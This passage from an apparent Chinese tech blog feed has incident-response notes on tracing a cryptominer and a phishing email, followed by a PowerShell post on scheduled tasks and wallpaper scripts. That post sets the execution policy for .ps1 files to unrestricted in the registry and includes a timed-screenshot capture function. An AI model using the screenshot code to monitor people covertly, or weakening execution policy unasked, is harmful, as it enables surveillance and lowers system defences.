id="grub相关文档"><a href="#grub相关文档" class="headerlink" title="grub相关文档"></a>grub相关文档</h4><p>GNU GRUB Manual 2.06 <a href="https://www.gnu.org/software/grub/manual/grub/html_node/index.html">https://www.gnu.org/software/grub/manual/grub/html_node/index.html</a><br>GRUB2配置文件”grub.cfg”详解(GRUB2实战手册)–金步国作品 <a href="http://www.jinbuguo.com/linux/grub.cfg.html">http://www.jinbuguo.com/linux/grub.cfg.html</a></p><blockquote><p>参考链接 <a href="https://blog.csdn.net/ymz641/article/details/120719529">https://blog.csdn.net/ymz641/article/details/120719529</a></p></blockquote><hr><h2 id="实战之挖矿病毒溯源"><a href="#实战之挖矿病毒溯源" class="headerlink" title="实战之挖矿病毒溯源"></a>实战之挖矿病毒溯源</h2><p>2.25一觉睡醒腾讯云接连报了几个毒，最近做实验做完了这台机器就没关云防火墙，恰巧和ssh密码相关的实验，期间有个弱口令被爆了，结果中了马</p><p>腾讯云曝了异地登录ip，124.160.96.249</p><p>溯源一下，杭州企业网，<del>估计又是哪个倒霉肉鸡</del></p><p>上机排查</p><p>htop发现我这2核cpu使用率160%+，锁定路径与文件名</p><p>不确定此时是否在线</p><p>who 一下，发现没有</p><p>这小子估计是用cpu挖矿了</p><p>先不管，netstat -anop | grep 目标文件名</p><p>发现1个established，</p><p>溯源一下，荷兰，好家伙法外之地，发现主机开着</p><p>回头kill掉这给进程，ps -aux | grep 程序</p><p>kill 文件pid</p><p>ps一下发现有一个居然没kill掉</p><p>kill -9 文件名</p><p>还是没杀掉</p><p>htop处得知运行用户是我众多用户的一个弱密码用户，正好趁机清理一些平时做实验的没用账户</p><p>userdel -f 目标用户</p><p>然后就没了</p><p>后来发现这个其实是僵尸进程，该进程释放了资源但是没有得到父进程的确认。具体可以研究一下daemon类进程，孤儿进程，僵尸进程这些的父子关系<del>争取哪天自己也用上这招</del></p><p>后来对此次木马样本进行分析，发现还给我留了个rsync后门</p><p>真当我这是后院了还</p><p>主程序是一个二进制挖矿程序</p><p>两主程序用来检测系统版本型号以及控制开关</p><p>之后按照流程，排查了计划任务是否被改动</p><p>在时间段内各个用户的bash-history以及systemlog</p><p>别说还真管用，一开始攻击者还就是把文件上传到temp文件夹下然后自删除</p><p>之后躲到那个用户的隐藏目录下</p><p>但还是躲不过find大法好</p><p>样本取差不多之后，把云防火墙不需要端口给关了。</p><p><del>要是我专门创个弱密码弱口令放网上，是不是就可以搜刮其他样本了</del></p><h2 id="实战之钓鱼邮件溯源"><a href="#实战之钓鱼邮件溯源" class="headerlink" title="实战之钓鱼邮件溯源"></a>实战之钓鱼邮件溯源</h2><p>某敏感时期</p><p>收到一钓鱼邮件</p><p>还好员工意识比较强没点开</p><p>员工外网办公笔记本</p><p>断wifi，禁用网卡，敲出样本</p><p>二话不说好家伙，甲方直接给这员工重装了系统</p><p>伪装的很像啊，发件地址的后缀不注意都一模一样</p><p>excel伪装再像你不改后缀exe还是能被发现，即使名字起的再长，显得欲盖弥彰</p><p>邮件用notepad打开，找到两ip</p><p>溯一下，一个住宅肉鸡</p><p>一个阿里云cdn</p><p>调官方api查cdn信息，线索中断。。。</p><p>再来看看样本分析</p><p>二进制文件丢进沙箱跑一下</p><p>这病毒挺强，分析报告看的我冒冷汗。</p><p>甚至包括了虚拟机逃逸，容器逃逸。。。</p><p>得亏没有运行</p><h2 id="实战之教授主机病毒"><a href="#实战之教授主机病毒" class="headerlink" title="实战之教授主机病毒"></a>实战之教授主机病毒</h2><p>待更……</p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> fluxion </tag>
            
            <tag> cap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计划任务运行powershell自动获取聚焦图片并设为壁纸</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%A3%81%E7%BA%B8/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%A3%81%E7%BA%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="win计划任务"><a href="#win计划任务" class="headerlink" title="win计划任务"></a>win计划任务</h2><p>电脑右键管理中找，</p><p>创建任务，设置名称，任务运行权限等基本信息</p><p>触发条件，时间</p><p>运行程序，可以运行qq音乐，结合qq音乐软件设置打开自动播放可以实现自动播放，缺点暂时还不知道怎么确定播放计划的音乐，比如我想听每日推荐，但是任务列表不会自动更换</p><p>但是当运行ps1这个powershell脚本文件时，默认双击用记事本打开，网上介绍两种方法，创建快捷方式</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210708104740905.png" alt="image-20210708104740905">尝试无效</p><p>故修改注册表文件</p><h2 id="用powershell运行ps1"><a href="#用powershell运行ps1" class="headerlink" title="用powershell运行ps1"></a>用powershell运行ps1</h2><p>默认win10双击ps1文件用记事本打开</p><p>修改注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\open\command</span><br></pre></td></tr></table></figure><p>设置运行程序为powershell，权限unrestricted</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> -noLogo -ExecutionPolicy unrestricted -file <span class="string">&quot;%1&quot;</span></span><br></pre></td></tr></table></figure><p>之后就可以双击运行ps1文件，意味着使用任务计划才可以自动运行ps1脚本。</p><h2 id="powershell播放指定音乐"><a href="#powershell播放指定音乐" class="headerlink" title="powershell播放指定音乐"></a>powershell播放指定音乐</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> presentationCore</span><br><span class="line"><span class="comment">#添加presentationCore</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;G:\QQ Music Download\In the Rain.mp3&quot;</span></span><br><span class="line"><span class="comment">#音乐文件的位置</span></span><br><span class="line"><span class="variable">$player</span> = <span class="built_in">New-Object</span> System.Windows.Media.MediaPlayer</span><br><span class="line"><span class="comment">#新建一个播放器对象</span></span><br><span class="line"><span class="variable">$player</span>.Open(<span class="variable">$path</span>)</span><br><span class="line"><span class="comment">#打开之前的创建的$path变量，也就是打开音乐文件</span></span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="number">1</span></span><br><span class="line"><span class="comment">#暂停一下，等待音乐文件加载完成</span></span><br><span class="line"><span class="variable">$time</span> = <span class="variable">$player</span>.NaturalDuration.TimeSpan.TotalSeconds</span><br><span class="line"><span class="comment">#把音乐的时间长度设置为一个变量备用</span></span><br><span class="line"><span class="variable">$player</span>.Play()</span><br><span class="line"><span class="comment">#开始播放音乐</span></span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="variable">$time</span></span><br><span class="line"><span class="comment">#等待音乐播放完成，这里就用了上面的时间变量</span></span><br><span class="line"><span class="variable">$player</span>.Stop()</span><br><span class="line"><span class="comment">#停止播放</span></span><br><span class="line"><span class="variable">$player</span>.Close()</span><br><span class="line"><span class="comment">#关闭播放器</span></span><br></pre></td></tr></table></figure><h2 id="获取微软每日聚焦"><a href="#获取微软每日聚焦" class="headerlink" title="获取微软每日聚焦"></a>获取微软每日聚焦</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将复制出来的缓存图片保存在下面的文件夹</span></span><br><span class="line"><span class="comment"># 新增目录</span></span><br><span class="line"><span class="built_in">add-type</span> <span class="literal">-AssemblyName</span> System.Drawing</span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight&quot;</span> <span class="literal">-ItemType</span> directory <span class="literal">-Force</span>;</span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\CopyAssets&quot;</span> <span class="literal">-ItemType</span> directory <span class="literal">-Force</span>;</span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\Horizontal&quot;</span> <span class="literal">-ItemType</span> directory <span class="literal">-Force</span>;</span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\Vertical&quot;</span> <span class="literal">-ItemType</span> directory <span class="literal">-Force</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 先将横竖图片全部复制到上面新建的CopyAssets文件夹中</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file</span> <span class="keyword">in</span> (<span class="built_in">Get-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:LOCALAPPDATA</span>)\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\*&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># 聚焦图片的位置</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">Get-Item</span> <span class="variable">$file</span>).length <span class="operator">-lt</span> <span class="number">100</span>kb) &#123; <span class="keyword">continue</span> &#125;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$file</span>.FullName <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\CopyAssets\<span class="variable">$</span>(<span class="variable">$file</span>.Name).jpg&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将CopyAssets这个临时中转图片的文件夹中的宽度不一的图片分类，分别复制到对应宽度的两个文件夹</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$newfile</span> <span class="keyword">in</span> (<span class="built_in">Get-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\CopyAssets\*&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$image</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WIA.ImageFile;</span><br><span class="line">    <span class="variable">$image</span>.LoadFile(<span class="variable">$newfile</span>.FullName);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$image</span>.Width.ToString() <span class="operator">-eq</span> <span class="string">&quot;1920&quot;</span>)&#123; <span class="built_in">Move-Item</span> <span class="variable">$newfile</span>.FullName <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\Horizontal&quot;</span> <span class="literal">-Force</span>; &#125;</span><br><span class="line">    <span class="comment">#  将宽为1920px的移动到开始新建的Horizontal文件夹中</span></span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$image</span>.Width.ToString() <span class="operator">-eq</span> <span class="string">&quot;1080&quot;</span>)&#123; <span class="built_in">Move-Item</span> <span class="variable">$newfile</span>.FullName <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\Vertical&quot;</span> <span class="literal">-Force</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处可插入设置壁纸代码 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除临时文件夹CopyAssets对象</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\CopyAssets\*&quot;</span>;</span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="将图片设置为壁纸"><a href="#将图片设置为壁纸" class="headerlink" title="将图片设置为壁纸"></a>将图片设置为壁纸</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 壁纸设置函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set-Wallpaper</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>)]</span><br><span class="line">        <span class="variable">$Path</span>,</span><br><span class="line"> </span><br><span class="line">        [<span class="type">ValidateSet</span>(<span class="string">&#x27;Center&#x27;</span>, <span class="string">&#x27;Stretch&#x27;</span>)]</span><br><span class="line">        <span class="variable">$Style</span> = <span class="string">&#x27;Center&#x27;</span></span><br><span class="line">        <span class="comment"># 两种壁纸风格</span></span><br><span class="line">    )</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">Add-Type</span> <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">using Microsoft.Win32;</span></span><br><span class="line"><span class="string">namespace Wallpaper</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public enum Style : int</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">Center, Stretch</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">public class Setter &#123;</span></span><br><span class="line"><span class="string">public const int SetDesktopWallpaper = 20;</span></span><br><span class="line"><span class="string">public const int UpdateIniFile = 0x01;</span></span><br><span class="line"><span class="string">public const int SendWinIniChange = 0x02;</span></span><br><span class="line"><span class="string">[DllImport(&quot;user32.dll&quot;, SetLastError = true, CharSet = CharSet.Auto)]</span></span><br><span class="line"><span class="string">private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);</span></span><br><span class="line"><span class="string">public static void SetWallpaper ( string path, Wallpaper.Style style ) &#123;</span></span><br><span class="line"><span class="string">SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );</span></span><br><span class="line"><span class="string">RegistryKey key = Registry.CurrentUser.OpenSubKey(&quot;Control Panel\\Desktop&quot;, true);</span></span><br><span class="line"><span class="string">switch( style )</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">case Style.Stretch :</span></span><br><span class="line"><span class="string">key.SetValue(@&quot;WallpaperStyle&quot;, &quot;2&quot;) ;</span></span><br><span class="line"><span class="string">key.SetValue(@&quot;TileWallpaper&quot;, &quot;0&quot;) ;</span></span><br><span class="line"><span class="string">break;</span></span><br><span class="line"><span class="string">case Style.Center :</span></span><br><span class="line"><span class="string">key.SetValue(@&quot;WallpaperStyle&quot;, &quot;1&quot;) ;</span></span><br><span class="line"><span class="string">key.SetValue(@&quot;TileWallpaper&quot;, &quot;0&quot;) ;</span></span><br><span class="line"><span class="string">break;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">key.Close();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"> </span><br><span class="line">    [<span class="type">Wallpaper.Setter</span>]::SetWallpaper( <span class="variable">$Path</span>, <span class="variable">$Style</span> )</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置图片文件夹的路径</span></span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$env:USERPROFILE</span>)\Pictures\Spotlight\Horizontal\*&quot;</span></span><br><span class="line"><span class="comment"># 选中最后写入时间的文件的路径</span></span><br><span class="line"><span class="variable">$file</span> = <span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="variable">$filePath</span> | <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> LastWriteTime <span class="literal">-Descending</span> | <span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用设置壁纸函数，传入目标图像对象的路径</span></span><br><span class="line"><span class="built_in">Set-Wallpaper</span> <span class="literal">-Path</span> <span class="variable">$file</span>.FullName  </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$file</span>.FullName</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="其他有趣代码"><a href="#其他有趣代码" class="headerlink" title="其他有趣代码"></a>其他有趣代码</h2><h3 id="get-random控制台闪烁"><a href="#get-random控制台闪烁" class="headerlink" title="get-random控制台闪烁"></a>get-random控制台闪烁</h3><p>在Powershell中有一条命令Get-Random，千万不要以为它的作用仅限于产生随机数。它还可以从固定的集合中随机产生对象呢。</p><p>例如控制台的颜色是一个枚举的类型，我们可以将所有支持的控制台背景颜色的枚举值作为一个集合，然后让它随机一个值，并每秒钟设置控制台颜色一次，以此来造成高度闪烁提示用户。不尽然有实用性，但是可以拿来玩！</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$consoleBackGroundColors</span>=[<span class="type">enum</span>]::GetNames([<span class="type">System.ConsoleColor</span>])</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">1000000</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="variable">$Host</span>.UI.RawUI.BackgroundColor=<span class="built_in">Get-Random</span> <span class="literal">-InputObject</span>  <span class="variable">$consoleBackGroundColors</span></span><br><span class="line">   <span class="built_in">cls</span></span><br><span class="line">   <span class="built_in">sleep</span> <span class="literal">-Milliseconds</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>摘自：<a href="https://www.pstips.net/powershell-generate-object.html">https://www.pstips.net/powershell-generate-object.html</a></p><h3 id="定时抓取屏幕"><a href="#定时抓取屏幕" class="headerlink" title="定时抓取屏幕"></a>定时抓取屏幕</h3><p>参考链接：<a href="https://www.jb51.net/article/56137.htm">https://www.jb51.net/article/56137.htm</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"> =====文件名：<span class="built_in">Get-TimedScreenshot</span>.ps1=====</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-TimedScreenshot</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Author:fuhj(powershell#live.cn ,http://fuhaijun.com) </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Takes screenshots at a regular interval and saves them to disk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Path</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Specifies the folder path.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Interval</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Specifies the interval in seconds between taking screenshots.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.Parameter EndTime</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Specifies when the script should stop running in the format HH-MM</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.Example</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    <span class="function">[<span class="type">CmdletBinding</span>()] <span class="keyword">Param</span></span>(</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$True</span>)]</span><br><span class="line"></span><br><span class="line">        [<span class="type">ValidateScript</span>(&#123;<span class="built_in">Test-Path</span> -<span class="type">Path</span> <span class="variable">$_</span> &#125;)]</span><br><span class="line"></span><br><span class="line">        [<span class="built_in">String</span>] <span class="variable">$Path</span>,</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$True</span>)]</span><br><span class="line"></span><br><span class="line">        [<span class="built_in">Int</span><span class="type">32</span>] <span class="variable">$Interval</span>,</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$True</span>)]</span><br><span class="line"></span><br><span class="line">        [<span class="built_in">String</span>] <span class="variable">$EndTime</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#Define helper function that generates and saves screenshot</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">Function</span> <span class="title">Get-Screenshot</span></span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$ScreenBounds</span> = [<span class="type">Windows.Forms.SystemInformation</span>]::VirtualScreen</span><br><span class="line"></span><br><span class="line">       <span class="variable">$ScreenshotObject</span> = <span class="built_in">New-Object</span> Drawing.Bitmap <span class="variable">$ScreenBounds</span>.Width, <span class="variable">$ScreenBounds</span>.Height</span><br><span class="line"></span><br><span class="line">       <span class="variable">$DrawingGraphics</span> = [<span class="type">Drawing.Graphics</span>]::FromImage(<span class="variable">$ScreenshotObject</span>)</span><br><span class="line"></span><br><span class="line">       <span class="variable">$DrawingGraphics</span>.CopyFromScreen( <span class="variable">$ScreenBounds</span>.Location, [<span class="type">Drawing.Point</span>]::Empty, <span class="variable">$ScreenBounds</span>.Size)</span><br><span class="line"></span><br><span class="line">       <span class="variable">$DrawingGraphics</span>.Dispose()</span><br><span class="line"></span><br><span class="line">       <span class="variable">$ScreenshotObject</span>.Save(<span class="variable">$FilePath</span>)</span><br><span class="line"></span><br><span class="line">       <span class="variable">$ScreenshotObject</span>.Dispose()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Try</span> &#123;</span><br><span class="line">        <span class="comment">#load required assembly</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">Add-Type</span> <span class="literal">-Assembly</span> System.Windows.Forms           </span><br><span class="line">        <span class="keyword">Do</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#get the current time and build the filename from it</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$Time</span> = (<span class="built_in">Get-Date</span>)</span><br><span class="line">            [<span class="built_in">String</span>] <span class="variable">$FileName</span> = <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Time</span>.Month)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Time</span>.Day)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Time</span>.Year)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Time</span>.Hour)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Time</span>.Minute)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> += <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Time</span>.Second)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$FileName</span> 